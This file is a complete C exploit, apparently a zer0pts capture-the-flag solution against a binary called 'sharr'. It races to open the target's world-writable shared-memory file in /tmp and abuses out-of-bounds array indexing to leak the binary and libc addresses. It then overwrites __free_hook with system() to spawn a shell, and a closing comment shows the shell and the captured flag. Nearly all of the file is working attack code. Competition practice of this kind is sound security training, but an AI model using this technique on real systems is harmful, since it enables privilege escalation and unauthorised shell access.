// gcc exploit.c -o exploit_remote
// gcc exploit.c -D_LOCAL -o exploit_local

#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/stat.h>

int exploit(void);

bool verbose = false;

int main(int argc, char *argv[]){
	if(argc > 1 && !strcmp(argv[1], "-v"))
		verbose = true;

	switch(fork()){
		case -1:
			perror("fork");
			return -1;
		case 0:
			umask(0);
			execl("./sharr", "hoge", "-v", "65098", NULL); // 0666 -> 0xffffffffffff01b6 -> -65098
			break;
		default:
			exploit();
			wait(NULL);
			break;
	}

	return 0;
}

#define CMD_WAIT 0
#define CMD_EDIT 1
#define CMD_SHOW 2
#define CMD_EXIT 3

typedef struct {
  int command;
  ssize_t index;
  size_t value;
} ArrayIO;
ArrayIO *io;

void cmd_edit(ssize_t idx, uint64_t value);
uint64_t cmd_show(ssize_t idx);
void cmd_exit(void);

const uint64_t ofs_init_array		= 0x3cc0;
const uint64_t ofs_got_write		= 0x3ef8;
#ifdef _LOCAL
#define ENV "LOCAL"
const uint64_t ofs_libc_system		= 0x0522c0;
const uint64_t ofs_libc_write		= 0x10e090;
const uint64_t ofs_libc_free_hook	= 0x1eee48;
#else
#define ENV "REMOTE"
const uint64_t ofs_libc_system		= 0x052290;
const uint64_t ofs_libc_write		= 0x10e060;
const uint64_t ofs_libc_free_hook	= 0x1eee48;
#endif

int exploit(void){
	char *mapname;
	int mapfd;

	puts("[!] Compiled for " ENV " environment");

	srand(time(NULL));

	if(asprintf(&mapname, "/tmp/.shm-%08x", rand()) < 0)
		return -1;

	printf("[*] Trying to open \"%s\"...\n", mapname);
	for(int i=0; i<1000; i++){
		if((mapfd = open(mapname, O_RDWR)) > 0)
			break;
		//usleep(100);
	}
	free(mapname);

	if(mapfd < 0){
		puts("[-] Failed...");
		return -1;
	}

	puts("[+] Success!");
	usleep(100000);

	io = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, mapfd, 0);

	cmd_edit(0, *(uint64_t*)"/bin/sh");

	puts("[*] Searching binary...");
	int i;
	for(i = 1;; i++)
		if(cmd_show(-(0x2a0+0x5000*i)/8) != 0xdeadbeef)
			break;

	for(i = i*5+1;; i++)
		if(cmd_show(-(0x2a0+0x1000*i)/8) == 0xdeadbeef)
			break;

	int64_t ofs_bin = -(0x2a0+0x1000*(i-1));
	if(cmd_show(ofs_bin/8) != 0x00010102464c457f){
		puts("[-] Failed...");
		return -1;
	}

	printf("[+] Found!\nOffset: %lx\n", ofs_bin);

	uint64_t addr_bin_base = cmd_show((ofs_bin + ofs_init_array)/8) - 0x14e0;
	printf("[+] addr_bin_base	= 0x%08lx\n", addr_bin_base);

	uint64_t addr_libc_write = cmd_show((ofs_bin + ofs_got_write)/8);
	uint64_t addr_libc_base = addr_libc_write - ofs_libc_write;
	printf("[+] addr_libc_base	= 0x%08lx\n", addr_libc_base);

	uint64_t addr_libc_system    = addr_libc_base + ofs_libc_system;
	uint64_t addr_libc_free_hook = addr_libc_base + ofs_libc_free_hook;

	printf("[*] Overwriting free_hook with system: 0x%08lx <- 0x%08lx\n", addr_libc_free_hook, addr_libc_system);
	cmd_edit((ofs_bin + (addr_libc_free_hook - addr_bin_base))/8, addr_libc_system);

	printf("[*] Exit to trigger system\n");
	cmd_exit();

	munmap(io, 0x1000);
	io = NULL;
	close(mapfd);

	return 0;
}

#define WAIT() while(io->command != CMD_WAIT) usleep(100000);

void cmd_edit(int64_t idx, uint64_t value){
	if(verbose)
		printf("[EDIT] index: %ld, value: %lx\n", idx, value);

	WAIT();
	*io = *(ArrayIO[1]){CMD_EDIT, idx, value};
	WAIT();
}

uint64_t cmd_show(int64_t idx){
	WAIT();
	*io = *(ArrayIO[1]){CMD_SHOW, idx, 0xdeadbeef};
	WAIT();

	if(verbose)
		printf("[SHOW] index: %ld, value: %lx\n", io->index, io->value);

	return io->value;
}

void cmd_exit(void){
	WAIT();
	io->command = CMD_EXIT;
}

/*
$ id
id
uid=999(admin) gid=1000(pwn) groups=1000(pwn)
$ cat flag*
cat flag*
zer0pts{1_sh0uld_h4v3_us3d_creat_1nst34d_0f_open+chmod}
$ 
*/
